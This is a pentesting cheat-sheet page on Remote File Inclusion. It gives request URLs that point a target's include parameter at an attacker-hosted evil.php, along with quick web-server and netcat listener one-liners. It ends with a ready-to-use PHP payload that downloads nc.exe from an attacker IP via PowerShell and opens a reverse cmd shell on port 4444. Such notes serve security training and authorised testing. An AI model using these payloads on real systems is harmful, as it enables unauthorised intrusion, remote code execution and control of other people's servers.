# RFI

Related to command injection as well:

{% embed url="https://www.offensive-security.com/metasploit-unleashed/web-delivery/" %}

{% hint style="info" %}
Less common than LFI since it needs allow\_url\_include such as data:// wrapper. Allow us to include files via HTTP or SMB.

We could also use a publicly-accessible file, such as one from Github.

Common scenarios where we’ll find this option enabled is when the web application loads files or contents from remote systems e.g. libraries or application data.
{% endhint %}

We can serve a PHP shell for example with Python http.server to trigger the RFI. For example:

```bash
http://MachineIP/index.php?param=Kali_IP/shell.php
http://$IP/file=http://$MY_IP/evil.php%00
http://$IP/file=http://$MY_IP/evil.php?

#busybox
busybox httpd -f -p 10000

#Ruby
ruby -run -e httpd . -p 9000

#PHP
php -S 0.0.0.0:8000

# Just for testing RFI → use nc -lvnp 80 instead of Python server
```

## RFI to RCE <a href="#remote-file-inclusion-shell-windows-php" id="remote-file-inclusion-shell-windows-php"></a>

[https://www.thehacker.recipes/web/inputs/file-inclusion/rfi-to-rce](https://www.thehacker.recipes/web/inputs/file-inclusion/rfi-to-rce)

## UNC Path

```bash
//$IP/something
```

## RFI via SMB Server <a href="#remote-file-inclusion-shell-windows-php" id="remote-file-inclusion-shell-windows-php"></a>

{% content-ref url="../ports/smb.md" %}
[smb.md](../ports/smb.md)
{% endcontent-ref %}

## Windows Shell (PHP) <a href="#remote-file-inclusion-shell-windows-php" id="remote-file-inclusion-shell-windows-php"></a>

{% code overflow="wrap" fullWidth="true" %}
```php
<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.245/netcat/nc.exe','nc.exe'); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe\" }"); ?>
```
{% endcode %}
